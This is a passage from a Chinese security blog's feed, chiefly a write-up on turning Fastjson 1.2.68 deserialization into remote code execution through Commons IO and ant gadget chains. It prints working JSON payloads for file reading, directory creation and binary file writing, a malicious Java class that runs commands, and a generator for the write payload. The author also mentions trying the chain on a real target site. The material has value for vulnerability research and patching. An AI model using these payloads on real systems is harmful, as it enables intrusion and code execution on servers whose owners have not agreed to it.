src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220928/aaa.qtgewqib3bk.jpg"></p><p>以后要忠实的做好每一个大佬的舔狗</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220928/qq.5hrr22slzeo0.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Goby指纹与POC提取复现&quot;&gt;&lt;a href=&quot;#Goby指纹与POC提取复现&quot; class=&quot;headerlink&quot; title=&quot;Goby指纹与POC提取复现&quot;&gt;&lt;/a&gt;Goby指纹与POC提取复现&lt;/h1&gt;&lt;p&gt;最近看了w8ay师傅发的关于提取Goby指纹</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://rainsec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="https://rainsec.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson 1.2.80调试小记</title>
    <link href="https://rainsec.cn/post/fastjson%201.2.80%E8%B0%83%E8%AF%95%E5%B0%8F%E8%AE%B0.html"/>
    <id>https://rainsec.cn/post/fastjson%201.2.80%E8%B0%83%E8%AF%95%E5%B0%8F%E8%AE%B0.html</id>
    <published>2022-09-27T10:38:45.000Z</published>
    <updated>2023-04-12T02:36:51.343Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fastjson-1-2-68-反序列化rce探索"><a href="#fastjson-1-2-68-反序列化rce探索" class="headerlink" title="fastjson 1.2.68 反序列化rce探索"></a>fastjson 1.2.68 反序列化rce探索</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  fastjson 1.2.68 目前公开的利用链中比较好用的是voidfyoo师傅的Commons IO 写文件链子，但是在spring环境下，仅仅通过写文件rce较为困难，本文更多的是结合多位师傅的文章理出一条通过写文件稳定rce方法</p><h2 id="JDK8任意文件写场景下的Fastjson-RCE"><a href="#JDK8任意文件写场景下的Fastjson-RCE" class="headerlink" title="JDK8任意文件写场景下的Fastjson RCE"></a>JDK8任意文件写场景下的Fastjson RCE</h2><p>  通过覆盖charsets.jar缺点太多，一是文件大，二是java版本不适配。另外笔者觉得还有一个致命因素，一般来说项目中只要使用了Charset.forName 就会加载charsets.jar，这样来讲正常的业务代码中几乎都已经加载过charsets.jar，即使后来再覆盖charsets.jar也不会重新加载。仅为笔者个人（java初学者）想法（或许是在哪里看到过别的师傅的文章，有点印象），如有错误欢迎师傅指点。</p><p>  threedr3am师傅给出了任意文件写的情况下，如何更稳定地rce。简单来讲如果写一个恶意的class到jre/classes/目录下，class内容如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyClass</span> <span class="token keyword">implements</span> <span class="token class-name">AutoCloseable</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"open -a Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var1<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  正在运行的项目会加载这个class文件，我们只需要使用如下poc即可rce。</p><pre class="line-numbers language-none"><code class="language-none">{"@type":"java.lang.AutoCloseable","@type":"MyClass","cmd":"open -a Calculator"}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  这里只做简述，具体原理到threedr3am师傅的博客中查看。</p><p>  很可惜的是jre目录下默认并不会存在classes目录，另外voidfyoo师傅给出的Commons IO 写文件链子不能写二进制文件，具体原因是使用的输入输出流都是经过编码的，而二进制文件中部分字符编码/解码失败就会写入脏字符。<br>那么目前我们需要解决的问题有三点：</p><ol><li>获取jdk目录</li><li>创建classes目录</li><li>写入class文件</li></ol><h2 id="获取jdk目录"><a href="#获取jdk目录" class="headerlink" title="获取jdk目录"></a>获取jdk目录</h2><p>  在Blackhat的议题中分享了一条commons-io逐字节读文件的链子，但是局限性很大。经过浅蓝师傅的扩展，目前可以做到有抛出异常的布尔读和利用dnslog 无回显读 ,贴一下浅蓝师傅的有抛出异常的布尔读取文件的poc：</p><pre class="line-numbers language-none"><code class="language-none">{  "abc":{"@type": "java.lang.AutoCloseable",    "@type": "org.apache.commons.io.input.BOMInputStream",    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",        "url": "file:///tmp/test"      },      "charsetName": "UTF-8",      "bufferSize": 1024    },"boms": [      {        "@type": "org.apache.commons.io.ByteOrderMark",        "charsetName": "UTF-8",        "bytes": [          98        ]      }    ]  },  "address" : {"@type": "java.lang.AutoCloseable","@type":"org.apache.commons.io.input.CharSequenceReader","charSequence": {"@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},"start": 0,"end": 0}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  当字节码对比一致时就会走到下面charSequence处，因为类型不一致fastjson报错，业务抛出异常，<br>字节码对比不一致时返回为null，fastjson也就不会报错，业务回显正常。<br>我们可以直接读取启动命令 /proc/self/cmdline， 有的时候直接是用绝对路径来启动的，如果不是可以用netdoc协议列目录找到jdk路径</p><h2 id="创建classes目录"><a href="#创建classes目录" class="headerlink" title="创建classes目录"></a>创建classes目录</h2><p>  笔者找到一条简单的通过Commons IO创建目录的链子，使用的类是<code>org.apache.commons.io.output.LockableFileWriter</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">LockableFileWriter</span><span class="token punctuation">(</span><span class="token class-name">File</span> file<span class="token punctuation">,</span> <span class="token class-name">Charset</span> encoding<span class="token punctuation">,</span> <span class="token keyword">boolean</span> append<span class="token punctuation">,</span> <span class="token class-name">String</span> lockDir<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        file <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getAbsoluteFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">getParentFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">forceMkdir</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">getParentFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">isDirectory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span><span class="token string">"File specified is a directory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>lockDir <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                lockDir <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"java.io.tmpdir"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token class-name">File</span> lockDirFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>lockDir<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">forceMkdir</span><span class="token punctuation">(</span>lockDirFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">testLockDir</span><span class="token punctuation">(</span>lockDirFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>lockFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>lockDirFile<span class="token punctuation">,</span> file<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".lck"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">createLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>out <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">initWriter</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> encoding<span class="token punctuation">,</span> append<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token class-name">FileUtils</span>#forceMkdir<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">forceMkdir</span><span class="token punctuation">(</span><span class="token class-name">File</span> directory<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>directory<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>directory<span class="token punctuation">.</span><span class="token function">mkdirs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>directory<span class="token punctuation">.</span><span class="token function">isDirectory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>poc</p><pre class="line-numbers language-none"><code class="language-none">{ "@type":"java.lang.AutoCloseable", "@type":"org.apache.commons.io.output.WriterOutputStream", "writer":{ "@type":"org.apache.commons.io.output.LockableFileWriter", "file":"/etc/passwd", //一个存在的文件 "encoding":"UTF-8", "append": true,"lockDir":"/usr/lib/jvm/java-8-openjdk-amd64/jre/classes" //要创建的目录 }, "charset":"UTF-8", "bufferSize": 8193, "writeImmediately": true }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  file需要是一个存在的文件，才能走到下面的FileUtils.forceMkdir(lockDirFile) 创建目录<br>注：mac环境下可能有保护机制，jre下classes创建不了，实测ubuntu上是可以创建的。</p><h2 id="写入class文件"><a href="#写入class文件" class="headerlink" title="写入class文件"></a>写入class文件</h2><p>  笔者能力有限，只依赖commons-io 未能找到一条写二进制文件的链子，在Blackhat的议题中分享了一条基于commons-io、commons-codec、aspectj写二进制文件的链，笔者近日打的fastjson刚好有commons-io、commons-codec，但是没有aspectj。于是在另一位师傅列出lib之后，在ant中找到了<code>org.apache.tools.ant.util.LazyFileOutputStream</code> 类，可以替代aspectj中的<code>org.eclipse.core.internal.localstore.SafeFileOutputStream</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">write_so</span><span class="token punctuation">(</span><span class="token class-name">String</span> target_path<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bom_buffer_bytes <span class="token operator">=</span> <span class="token function">readFileInBytesToString</span><span class="token punctuation">(</span><span class="token string">"./target/classes/MyClass.class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> base64_so_content <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>bom_buffer_bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> big_bom_buffer_bytes <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>base64_so_content<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"{\n"</span> <span class="token operator">+</span>                <span class="token string">"  \"@type\":\"java.lang.AutoCloseable\",\n"</span> <span class="token operator">+</span>                <span class="token string">"  \"@type\":\"org.apache.commons.io.input.BOMInputStream\",\n"</span> <span class="token operator">+</span>                <span class="token string">"  \"delegate\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"input\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"      \"@type\": \"org.apache.commons.codec.binary.Base64InputStream\",\n"</span> <span class="token operator">+</span>                <span class="token string">"      \"in\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"@type\":\"org.apache.commons.io.input.CharSequenceInputStream\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"charset\":\"utf-8\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"bufferSize\": 1024,\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"cs\":{\"@type\":\"java.lang.String\"\"%1$s\"\n"</span> <span class="token operator">+</span>                <span class="token string">"      },\n"</span> <span class="token operator">+</span>                <span class="token string">"      \"doEncode\":false,\n"</span> <span class="token operator">+</span>                <span class="token string">"      \"lineLength\":1024,\n"</span> <span class="token operator">+</span>                <span class="token string">"      \"lineSeparator\":\"5ZWKCg==\",\n"</span> <span class="token operator">+</span>                <span class="token string">"      \"decodingPolicy\":0\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"branch\":{\n"</span> <span class="token operator">+</span>                <span class="token comment">//"      \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\n" +</span>                <span class="token comment">//"      \"targetPath\":\"%2$s\"\n" +</span>                <span class="token string">"      \"@type\":\"org.apache.tools.ant.util.LazyFileOutputStream\",\n"</span> <span class="token operator">+</span>                <span class="token string">"      \"file\":\"%2$s\",\n"</span> <span class="token operator">+</span>                <span class="token string">"      \"append\":false,\n"</span> <span class="token operator">+</span>                <span class="token string">"      \"alwaysCreate\":true\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"closeBranch\":false\n"</span> <span class="token operator">+</span>                <span class="token string">"  },\n"</span> <span class="token operator">+</span>                <span class="token string">"  \"include\":true,\n"</span> <span class="token operator">+</span>                <span class="token string">"  \"boms\":[{\n"</span> <span class="token operator">+</span>                <span class="token string">"                  \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                  \"charsetName\": \"UTF-8\",\n"</span> <span class="token operator">+</span>                <span class="token string">"                  \"bytes\":"</span> <span class="token operator">+</span><span class="token string">"%3$s\n"</span> <span class="token operator">+</span>                <span class="token string">"                }],\n"</span> <span class="token operator">+</span>                <span class="token string">"  \"x\":{\"$ref\":\"$.bOM\"}\n"</span> <span class="token operator">+</span>                <span class="token string">"}"</span><span class="token punctuation">,</span>base64_so_content<span class="token punctuation">,</span> <span class="token string">"/tmp/MyClass.class"</span><span class="token punctuation">,</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>big_bom_buffer_bytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">readFileInBytesToString</span><span class="token punctuation">(</span><span class="token class-name">String</span> filePath<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">final</span> <span class="token keyword">int</span> readArraySizePerRead <span class="token operator">=</span> <span class="token number">4096</span><span class="token punctuation">;</span>        <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Byte</span><span class="token punctuation">&gt;</span></span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token class-name">DataInputStream</span> isr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>                        file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> tempchars <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>readArraySizePerRead<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> charsReadCount <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>charsReadCount <span class="token operator">=</span> isr<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>tempchars<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> i <span class="token operator">&lt;</span> charsReadCount <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        bytes<span class="token punctuation">.</span>add <span class="token punctuation">(</span>tempchars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                isr<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">// TODO Auto-generated catch block</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token function">toPrimitives</span><span class="token punctuation">(</span>bytes<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">toPrimitives</span><span class="token punctuation">(</span><span class="token class-name">Byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> oBytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>oBytes<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> oBytes<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            bytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> oBytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> bytes<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  笔者在vps用jar起的环境和本地手动创建classes目录之后都是可以成功的。</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20221114/1111.1y29qdvr30zk.png"></p><p>  但是打的站没成功，别的师傅通过别的链打下来后，笔者上去看了下class文件没问题，也能直接运行，但是很奇怪用fastjson加载不了。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>  在root权限下可以直接通过commons-io链写计划任务，低权限下通过写class文件rce，获取jdk目录、创建classes目录仅依赖commons-io，但是写入class文件需要更多不太常见的依赖，总的来讲利用条件还是较为苛刻的。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><ol><li>Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析(<a href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg">https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg</a>)</li><li>Blackhat 2021 议题详细分析 —— FastJson 反序列化漏洞及在区块链应用中的渗透利用(<a href="https://paper.seebug.org/1698/#3commons-io">https://paper.seebug.org/1698/#3commons-io</a>)</li><li>fastjson 读文件 gadget 的利用场景扩展(<a href="https://b1ue.cn/archives/506.html">https://b1ue.cn/archives/506.html</a>)</li><li>JDK8任意文件写场景下的Fastjson RCE(<a href="https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/">https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/</a>)</li></ol></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;fastjson-1-2-68-反序列化rce探索&quot;&gt;&lt;a href=&quot;#fastjson-1-2-68-反序列化rce探索&quot; class=&quot;headerlink&quot; title=&quot;fastjson 1.2.68 反序列化rce探索&quot;&gt;&lt;/a&gt;fastjson 1.</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://rainsec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="https://rainsec.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>一次攻防小记</title>
    <link href="https://rainsec.cn/post/%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E5%B0%8F%E8%AE%B0.html"/>
    <id>https://rainsec.cn/post/%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E5%B0%8F%E8%AE%B0.html</id>
